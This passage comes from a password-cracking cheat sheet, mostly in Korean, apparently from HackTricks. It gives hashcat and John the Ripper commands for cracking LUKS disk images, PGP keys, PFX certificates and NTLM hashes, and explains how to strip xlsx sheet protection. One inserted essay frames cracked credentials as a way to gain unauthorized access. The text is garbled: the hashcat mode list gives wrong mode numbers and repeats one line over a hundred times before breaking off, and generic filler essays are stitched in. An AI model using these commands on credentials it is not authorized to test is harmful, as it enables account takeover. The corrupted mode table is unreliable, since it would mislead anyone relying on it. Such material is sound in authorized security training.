Once you have the list of possible passwords, you can use automated tools or scripts to systematically try each password until the correct one is found. These tools often have features that allow you to customize the attack, such as specifying the character set, password length, or even using rules to generate variations of the passwords. 

Brute force attacks can be effective against weak passwords or poorly implemented encryption algorithms. However, they are not practical against strong passwords or properly implemented security measures. 

To protect against brute force attacks, it is important to use strong and unique passwords, implement account lockouts or delays after a certain number of failed login attempts, and use multi-factor authentication whenever possible.
```bash
cryptsetup luksDump backup.img #Check that the payload offset is set to 4096
dd if=backup.img of=luckshash bs=512 count=4097 #Payload offset +1
hashcat -m 14600 -a 0 luckshash  wordlists/rockyou.txt
cryptsetup luksOpen backup.img mylucksopen
ls /dev/mapper/ #You should find here the image mylucksopen
mount /dev/mapper/mylucksopen /mnt
```
다른 Luks BF 튜토리얼: [http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1](http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1)

### Mysql
```bash
#John hash format
<USERNAME>:$mysqlna$<CHALLENGE>*<RESPONSE>
dbuser:$mysqlna$112233445566778899aabbccddeeff1122334455*73def07da6fba5dcc1b19c918dbd998e0d1f3f9d
```
### PGP/GPG 개인 키

A PGP/GPG private key is a crucial component in the encryption and decryption process of PGP/GPG (Pretty Good Privacy/GNU Privacy Guard). It is used to securely encrypt messages and files, as well as to digitally sign them.

The private key should always be kept secret and protected, as it is used to decrypt messages that have been encrypted with the corresponding public key. If an attacker gains access to the private key, they can decrypt any encrypted messages or files associated with it.

Brute-forcing a PGP/GPG private key involves systematically trying all possible combinations until the correct key is found. This can be a time-consuming process, especially if the key is long and complex.

To protect against brute-force attacks, it is important to choose a strong and unique passphrase for the private key. Additionally, using a longer key length can increase the security of the private key.

Remember to securely store your private key and passphrase, as losing them can result in permanent loss of access to encrypted messages and files.
```bash
gpg2john private_pgp.key #This will generate the hash and save it in a file
john --wordlist=/usr/share/wordlists/rockyou.txt ./hash
```
### Cisco

<figure><img src="../.gitbook/assets/image (239).png" alt=""><figcaption></figcaption></figure>

### DPAPI 마스터 키

[https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py](https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py)를 사용한 다음 john을 사용하세요.

### Open Office Pwd Protected Column

열이 비밀번호로 보호된 xlsx 파일이 있는 경우 다음과 같이 보호를 해제할 수 있습니다:

* **Google 드라이브에 업로드**하면 비밀번호가 자동으로 제거됩니다.
* **수동으로 제거**하려면:
```bash
unzip file.xlsx
grep -R "sheetProtection" ./*
# Find something like: <sheetProtection algorithmName="SHA-512"
hashValue="hFq32ZstMEekuneGzHEfxeBZh3hnmO9nvv8qVHV8Ux+t+39/22E3pfr8aSuXISfrRV9UVfNEzidgv+Uvf8C5Tg" saltValue="U9oZfaVCkz5jWdhs9AA8nA" spinCount="100000" sheet="1" objects="1" scenarios="1"/>
# Remove that line and rezip the file
zip -r file.xls .
```
### PFX 인증서

PFX (Personal Information Exchange) 인증서는 개인 키와 인증서를 함께 포함하는 파일 형식입니다. 이 파일 형식은 주로 Windows 운영 체제에서 사용되며, 개인 키와 인증서를 하나의 파일로 묶어서 편리하게 관리할 수 있도록 합니다.

PFX 인증서는 대부분의 웹 브라우저와 서버에서 지원되며, SSL/TLS 암호화를 사용하는 웹 사이트에서 사용됩니다. 이러한 인증서는 인증 기관(Certificate Authority)에서 발급받을 수 있으며, 개인 키와 인증서를 안전하게 보호하기 위해 암호화될 수도 있습니다.

PFX 인증서를 사용하여 암호화된 통신을 설정하려면 개인 키와 인증서를 추출하여 웹 서버나 애플리케이션에 적용해야 합니다. 이를 위해 PFX 파일을 열고 암호를 입력한 후, 개인 키와 인증서를 추출할 수 있습니다.

PFX 인증서는 브루트 포스 공격에 취약할 수 있습니다. 브루트 포스 공격은 모든 가능한 조합을 시도하여 암호를 찾는 공격 기법입니다. 따라서 PFX 인증서의 암호는 강력하고 예측하기 어렵게 설정하는 것이 중요합니다.
```bash
# From https://github.com/Ridter/p12tool
./p12tool crack -c staff.pfx -f /usr/share/wordlists/rockyou.txt
# From https://github.com/crackpkcs12/crackpkcs12
crackpkcs12 -d /usr/share/wordlists/rockyou.txt ./cert.pfx
```
<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)을 사용하여 세계에서 가장 **고급**한 커뮤니티 도구로 구동되는 **워크플로우**를 쉽게 구축하고 자동화하세요.\
오늘 바로 액세스하세요:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## 도구

**해시 예시:** [https://openwall.info/wiki/john/sample-hashes](https://openwall.info/wiki/john/sample-hashes)

### 해시 식별기
```bash
hash-identifier
> <HASH>
```
### Wordlists

* **Rockyou**
* [**Probable-Wordlists**](https://github.com/berzerk0/Probable-Wordlists)
* [**Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/wordlists)
* [**Seclists - Passwords**](https://github.com/danielmiessler/SecLists/tree/master/Passwords)

### **Wordlist Generation Tools**

* [**kwprocessor**](https://github.com/hashcat/kwprocessor)**:** 구성 가능한 기본 문자, 키맵 및 경로를 가진 고급 키보드 워크 생성기.
```bash
kwp64.exe basechars\custom.base keymaps\uk.keymap routes\2-to-10-max-3-direction-changes.route -o D:\Tools\keywalk.txt
```
### John 변이

_**/etc/john/john.conf**_ 파일을 읽고 구성합니다.
```bash
john --wordlist=words.txt --rules --stdout > w_mutated.txt
john --wordlist=words.txt --rules=all --stdout > w_mutated.txt #Apply all rules
```
### Hashcat

#### Hashcat 공격

* **워드리스트 공격** (`-a 0`)과 규칙

**Hashcat**은 이미 **규칙이 포함된 폴더**를 가지고 있지만, [**여기에서 다른 흥미로운 규칙을 찾을 수 있습니다**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/rules).
```
hashcat.exe -a 0 -m 1000 C:\Temp\ntlm.txt .\rockyou.txt -r rules\best64.rule
```
* **워드리스트 조합** 공격

hashcat을 사용하여 2개의 워드리스트를 **하나로 결합**할 수 있습니다.\
첫 번째 리스트에는 **"hello"**라는 단어가 있고, 두 번째 리스트에는 **"world"**와 **"earth"**라는 단어가 각각 2줄씩 있을 경우, `helloworld`와 `helloearth`가 생성됩니다.
```bash
# This will combine 2 wordlists
hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt

# Same attack as before but adding chars in the newly generated words
# In the previous example this will generate:
## hello-world!
## hello-earth!
hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt -j $- -k $!
```
* **마스크 공격** (`-a 3`)
```bash
# Mask attack with simple mask
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt ?u?l?l?l?l?l?l?l?d

hashcat --help #will show the charsets and are as follows
? | Charset
===+=========
l | abcdefghijklmnopqrstuvwxyz
u | ABCDEFGHIJKLMNOPQRSTUVWXYZ
d | 0123456789
h | 0123456789abcdef
H | 0123456789ABCDEF
s | !"#$%&'()*+,-./:;<=>?@[\]^_`{|}~
a | ?l?u?d?s
b | 0x00 - 0xff

# Mask attack declaring custom charset
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt -1 ?d?s ?u?l?l?l?l?l?l?l?1
## -1 ?d?s defines a custom charset (digits and specials).
## ?u?l?l?l?l?l?l?l?1 is the mask, where "?1" is the custom charset.

# Mask attack with variable password length
## Create a file called masks.hcmask with this content:
?d?s,?u?l?l?l?l?1
?d?s,?u?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?l?l?1
## Use it to crack the password
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt .\masks.hcmask
```
* 워드리스트 + 마스크 (`-a 6`) / 마스크 + 워드리스트 (`-a 7`) 공격
```bash
# Mask numbers will be appended to each word in the wordlist
hashcat.exe -a 6 -m 1000 C:\Temp\ntlm.txt \wordlist.txt ?d?d?d?d

# Mask numbers will be prepended to each word in the wordlist
hashcat.exe -a 7 -m 1000 C:\Temp\ntlm.txt ?d?d?d?d \wordlist.txt
```
#### Hashcat 모드

Hashcat은 다양한 모드를 제공하여 다양한 해시 함수와 암호화 알고리즘을 해독할 수 있습니다. 각 모드는 특정 유형의 해시 또는 암호화를 대상으로 합니다. 다음은 일반적으로 사용되는 Hashcat 모드입니다.

- **0**: 해시 해독 모드
- **100**: SHA1
- **1400**: SHA256
- **1700**: SHA512
- **500**: MD5
- **900**: NTLM
- **1000**: NTLMv2
- **3000**: LM
- **5600**: NetNTLMv1
- **10000**: NetNTLMv2
- **110**: MySQL
- **300**: Oracle
- **131**: MSSQL
- **132**: MSSQL 2005
- **1731**: MSSQL 2012
- **200**: MySQL5
- **300**: Oracle 11g
- **3100**: Oracle 12c
- **112**: PostgreSQL
- **124**: PostgreSQL MD5
- **131**: MSSQL 2000
- **141**: EPiServer 6.x
- **2611**: vBulletin < v3.8.5
- **2711**: vBulletin > v3.8.5
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+, MyBB1.2+
- **2811**: IPB2+,
```bash
hashcat --example-hashes | grep -B1 -A2 "NTLM"
```
# Cracking Linux Hashes - /etc/shadow 파일

## 소개

리눅스 시스템에서 사용자 계정의 암호는 `/etc/shadow` 파일에 해시 형태로 저장됩니다. 이 파일은 root 권한으로만 접근할 수 있으며, 암호화된 형태로 사용자 계정의 정보를 포함하고 있습니다. 이 파일을 해독하여 사용자 계정의 암호를 추출하는 것은 해커들에게 매우 유용한 기술입니다.

## 해시 유형

`/etc/shadow` 파일에 저장된 암호는 다양한 해시 알고리즘을 사용하여 암호화됩니다. 일반적으로 사용되는 해시 유형은 다음과 같습니다:

- MD5
- SHA-256
- SHA-512

## 무차별 대입 공격 (Brute Force Attack)

무차별 대입 공격은 모든 가능한 조합을 시도하여 암호를 찾는 공격 기법입니다. `/etc/shadow` 파일에서 암호를 추출하기 위해 무차별 대입 공격을 사용할 수 있습니다. 이를 위해 다음과 같은 도구를 사용할 수 있습니다:

- John the Ripper
- Hashcat

무차별 대입 공격은 시간이 많이 소요되며, 강력한 암호의 경우 성공할 가능성이 낮습니다. 그러나 약한 암호의 경우 비교적 빠르게 암호를 찾을 수 있습니다.

## 사전 공격 (Dictionary Attack)

사전 공격은 미리 작성된 단어 목록을 사용하여 암호를 찾는 공격 기법입니다. `/etc/shadow` 파일에서 암호를 추출하기 위해 사전 공격을 사용할 수 있습니다. 이를 위해 다음과 같은 도구를 사용할 수 있습니다:

- John the Ripper
- Hashcat

사전 공격은 무차별 대입 공격보다 효율적이며, 일반적으로 더 빠르게 암호를 찾을 수 있습니다. 그러나 암호가 사전에 포함되어 있지 않은 경우에는 성공할 수 없습니다.

## 해시 무결성 검사

리눅스 시스템에서 `/etc/shadow` 파일은 root 권한으로만 접근할 수 있으므로 해시 무결성 검사를 통해 파일이 변경되지 않았는지 확인할 수 있습니다. 이를 위해 다음과 같은 도구를 사용할 수 있습니다:

- Tripwire
- AIDE

해시 무결성 검사는 시스템의 보안을 강화하는 데 도움이 되며, 해시 값이 변경된 경우 알림을 받을 수 있습니다.

## 결론

`/etc/shadow` 파일에서 암호를 추출하는 것은 해커들에게 매우 유용한 기술입니다. 무차별 대입 공격과 사전 공격을 사용하여 암호를 찾을 수 있으며, 해시 무결성 검사를 통해 파일의 변경 여부를 확인할 수 있습니다. 그러나 이러한 기술은 합법적인 목적으로만 사용되어야 하며, 불법적인 액세스 또는 암호 누출에는 사용해서는 안 됩니다.
```
500 | md5crypt $1$, MD5(Unix)                          | Operating-Systems
3200 | bcrypt $2*$, Blowfish(Unix)                      | Operating-Systems
7400 | sha256crypt $5$, SHA256(Unix)                    | Operating-Systems
1800 | sha512crypt $6$, SHA512(Unix)                    | Operating-Systems
```
# Cracking Windows Hashes

## Introduction

In this section, we will discuss the process of cracking Windows hashes. Windows hashes are cryptographic representations of user passwords stored in the Windows operating system. By cracking these hashes, we can obtain the original plaintext passwords.

## Methodologies

There are several methodologies that can be used to crack Windows hashes. Some of the commonly used ones include:

1. **Brute Force Attack**: This involves systematically trying all possible combinations of characters until the correct password is found. Brute force attacks can be time-consuming, especially for complex passwords.

2. **Dictionary Attack**: In this method, a pre-generated list of commonly used passwords, known as a dictionary, is used to attempt to crack the hash. This is more efficient than a brute force attack as it reduces the number of possible combinations.

3. **Rainbow Table Attack**: Rainbow tables are precomputed tables that contain a large number of hash-to-plaintext mappings. By looking up the hash in the table, we can quickly find the corresponding plaintext password.

## Tools

There are various tools available for cracking Windows hashes. Some popular ones include:

- **John the Ripper**: This is a powerful password cracking tool that supports multiple hash types, including Windows hashes.

- **Hashcat**: Another widely used password cracking tool that supports Windows hashes and utilizes the power of GPUs for faster cracking.

- **Cain and Abel**: This tool provides a comprehensive set of features for password cracking, including support for Windows hashes.

## Conclusion

Cracking Windows hashes can be a challenging task, especially for complex passwords. However, by using the right methodologies and tools, it is possible to crack these hashes and obtain the original plaintext passwords. It is important to note that cracking hashes without proper authorization is illegal and unethical.
```
3000 | LM                                               | Operating-Systems
1000 | NTLM                                             | Operating-Systems
```
# Cracking Common Application Hashes

## Introduction

In this section, we will discuss the process of cracking common application hashes. Hash cracking is a technique used to recover plaintext passwords from their hashed representations. By cracking application hashes, we can gain unauthorized access to user accounts and potentially compromise sensitive information.

## Methodology

The following steps outline a general methodology for cracking common application hashes:

1. **Obtain the Hash**: The first step is to obtain the hash that we want to crack. This can be done by extracting the hash from a compromised database, capturing network traffic, or using other reconnaissance techniques.

2. **Identify the Hash Type**: Next, we need to identify the type of hash that we are dealing with. Common hash types include MD5, SHA1, SHA256, and bcrypt. Knowing the hash type is crucial as it determines the cracking technique we will use.

3. **Build a Wordlist**: A wordlist is a collection of potential passwords that we will use to crack the hash. It is important to create a comprehensive wordlist that includes common passwords, dictionary words, and variations of known passwords.

4. **Choose a Cracking Technique**: Depending on the hash type, we can choose from various cracking techniques such as brute-force, dictionary attack, or rainbow table attack. Each technique has its own advantages and disadvantages, so it is important to choose the most appropriate one for the situation.

5. **Crack the Hash**: Once we have the hash, hash type, wordlist, and cracking technique, we can start the cracking process. This involves systematically trying each password in the wordlist and comparing its hash with the target hash until a match is found.

6. **Verify the Cracked Password**: After cracking the hash, it is important to verify the cracked password by logging into the target application using the recovered credentials. This ensures that the password is correct and can be used for unauthorized access.

## Tools

There are several tools available for cracking common application hashes. Some popular ones include:

- **John the Ripper**: A powerful password cracking tool that supports a wide range of hash types and cracking techniques.
- **Hashcat**: A versatile password cracking tool that can handle various hash types and supports distributed cracking.
- **Hydra**: A network login cracker that can be used for cracking application hashes over network protocols such as HTTP, FTP, and SSH.

## Conclusion

Cracking common application hashes is a fundamental skill for hackers and penetration testers. By understanding the methodology and using the right tools, we can successfully crack hashes and gain unauthorized access to user accounts. However, it is important to note that hash cracking should only be performed with proper authorization and for legitimate purposes.
```
900 | MD4                                              | Raw Hash
0 | MD5                                              | Raw Hash
5100 | Half MD5                                         | Raw Hash
100 | SHA1                                             | Raw Hash
10800 | SHA-384                                          | Raw Hash
1400 | SHA-256                                          | Raw Hash
1700 | SHA-512                                          | Raw Hash
```
<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)를 **팔로우**하세요.
* **Hacking 트릭을 공유하려면** [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하세요.

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks)를 사용하여 세계에서 가장 고급 커뮤니티 도구로 구동되는 **워크플로우를 쉽게 구축하고 자동화**하세요.\
오늘 바로 액세스하세요:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
